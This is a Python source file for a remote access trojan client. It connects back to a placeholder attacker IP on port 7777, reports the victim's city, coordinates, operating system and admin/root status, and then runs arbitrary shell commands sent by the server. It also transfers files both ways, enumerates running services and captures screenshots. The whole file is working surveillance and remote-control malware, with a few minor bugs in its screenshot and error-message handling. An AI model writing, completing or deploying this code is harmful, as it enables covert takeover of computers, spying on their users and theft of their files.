import subprocess
import socket
import sys
import time
import os
import platform
from colorama import Fore, Style
import pyautogui
import requests
import json
import psutil

server_ip = '<your ip>'  
port = 7777
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    client.connect((server_ip, port))
    print('[+] Connection successful [+]')
    time.sleep(2)

except ConnectionRefusedError:
    print(Fore.RED + 'Connection refused. Please check the server IP and port.' + Style.RESET_ALL)
    sys.exit()

def geolocation():
    url = 'https://ipinfo.io'
    response = requests.get(url,allow_redirects=True)
    if response.status_code == 200:
        information = json.loads(response.text)
        client.send(information['city'].encode())
        client.send(information['loc'].encode())
        
    else:
        client.send(Fore.RED+"[-] No Information about GeoLocation [-]"+Style.RESET_ALL)
        pass

def privilage():
    if system_type == 'windows':
        try:
            import pyuac
            if pyuac.isUserAdmin():
                client.send('[+] User is Administrator [+]\n'.encode('UTF-8'))
            else:
                client.send('[!] User is not Administrator [!]\n'.encode('UTF-8'))
        
        except ImportError:
            session = 'net session'
            control = subprocess.run(session, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            if control.returncode == 2:
                client.send("[!] User is not Administrator [!]\n".encode('UTF-8'))
            else:
                client.send("[+] User is Administrator [+]\n".encode('UTF-8'))
                
    elif system_type == 'linux' or system_type == 'darwin':
        id = subprocess.run('id', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        if b'uid=0(root)' in id.stdout:
            client.send('[+] User is root [+]\n'.encode('UTF-8'))
        else:
            client.send('[!] User is not root [!]\n'.encode('UTF-8'))
            
    else:
        client.send('[!] Unsupported operating system [!]\n'.encode('UTF-8'))

def system():
    global system_type
    system_type = platform.system().lower()

    if system_type == 'windows':
        client.send("[!] Device: Windows [!]\n".encode('UTF-8'))
    elif system_type == 'linux':
        client.send("[!] Device: Linux [!]\n".encode('UTF-8'))
    elif system_type == 'darwin':
        client.send("[!] Device: MacOS [!]\n".encode('UTF-8'))
    else:
        client.send("[!] I'm not sure about the OS info [!]\n".encode('UTF-8'))

def check_path():
    pwd = os.getcwd()
    home = os.getenv('USERPROFILE')
    if system_type == 'windows' and pwd != home:
        os.chdir(home)
    else:
        pass

def operations():
    while True:
        try:
            data = client.recv(4915200).decode('UTF-8')
            
            if not data:
                client.send('Please enter something or type "exit" to quit'.encode('UTF-8'))
                continue

            if data.lower() == 'exit':
                client.send('GoodBYE server...'.encode('UTF-8'))
                break

            if data.lower().startswith('cd '):
                try:
                    directory = data.split(" ", 1)[1]
                    os.chdir(directory)
                    current_directory = os.getcwd()
                    client.send(current_directory.encode('UTF-8'))
                    continue

                except FileNotFoundError:
                    client.send("The system cannot find the path specified.".encode('UTF-8'))
                    continue

            if data == 'cd'.strip():
                pwd = os.getcwd()
                client.send(pwd.encode('UTF-8'))
                continue
            
            if data == 'cd ~'.strip() and system_type == 'linux':
                os.chdir(os.getenv('HOME'))
                pwd = os.getcwd()
                client.send(pwd.encode('UTF-8'))
                continue

            if data == 'cd ../'.strip():
                os.chdir('..')
                pwd = os.getcwd()
                client.send(pwd.encode('UTF-8'))
                continue
            
            if data == 'service_enum':
                if system_type == 'windows':
                    def get_services():
                        services = []
                        for service in psutil.win_service_iter():
                            if service.status() == psutil.STATUS_RUNNING:
                                services.append(service.as_dict())
                        return services
                    running_services = get_services()
                    client.send("Running Services in the system..".encode('UTF-8'))
                    for service in running_services:
                        client.send(f"Name: {service['name']}\n".encode('UTF-8'))
                    client.send("-------------------------------\n".encode('UTF-8'))
                    continue

                elif system_type == 'linux':
                    services = 'service --status-all'
                    bash = subprocess.run(services,shell=True,stdout=subprocess.PIPE,text=True,stderr=subprocess.STDOUT)
                    output = bash.stdout
                    for service in output.splitlines():
                        if service.startswith(' [ + ]  ') or service.strip().startswith('[+]'):
                            client.send(service.encode('UTF-8'))
                    client.send("-------------------------------\n".encode('UTF-8'))
                    continue
                else:
                    pass
        
            if data.startswith('download '):
                file_name = data.split(" ",1)[1]
                print(file_name)
                if os.path.exists(file_name):
                    with open(file_name, 'rb') as f:
                        content = f.read()
                        if content:
                            client.sendall(content)
                            print("[+] File Has Sent ! [+]")
                    continue

            if data.startswith("upload "):
                file_name = data.split(" ", 1)[1] 
                file_content = client.recv(49152)
                with open(file_name, 'wb') as f:
                    f.write(file_content)
                print("[+] File received and saved successfully [+]")
                continue
            
            if data == 'screenshot':
                screenshot = pyautogui.screenshot()
                if system_type == 'windows':
                    temp_path = os.path.join(os.getenv('TEMP'), 'screenshot.png')
                    screenshot.save(temp_path)
                    with open(temp_path, 'rb') as f:
                        ss = f.read()
                    client.sendall(ss)
                    continue

                elif system_type == 'linux':
                    #system_type == 'linux'
                    temp_path = "/tmp/screenshot1.png"
                    screenshot.save(temp_path)
                    with open(temp_path,'r') as f:
                        ss = f.read()
                    client.sendall(ss)
                    continue
                
                elif system_type == 'darwin':
                    temp_path = '/tmp/screenshot.png'
                    screenshot.save(temp_path)
                    with open(temp_path,'r') as f:
                        ss = f.read()
                    client.sendall(ss)
                    continue

                else:
                    client.send(Fore.RED+"Operating system not detected for screenshot"+Style.RESET_ALL)
            try:
                shell = subprocess.run(data, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
                if shell.stdout:
                    client.send(shell.stdout)
                    
                else:
                    client.send(Fore.RED+"Command executed successfully\n".encode('UTF-8'))
                    Style.RESET_ALL
                    continue

            except (subprocess.CalledProcessError, subprocess.SubprocessError):
                continue

        except (ConnectionResetError, BrokenPipeError):
            print(Fore.RED + 'Connection lost with the server.' + Style.RESET_ALL)
            sys.exit()
        
        except ConnectionAbortedError:
            print(Fore.RED + 'Connection aborted by the server.' + Style.RESET_ALL)
            sys.exit()
            
        except Exception as e:
            client.send((Fore.RED + str(e) + Style.RESET_ALL).encode('utf-8'))

if __name__ == '__main__':
    geolocation()
    time.sleep(2)
    system()

    privilage()
    check_path()
    time.sleep(1)
    operations()
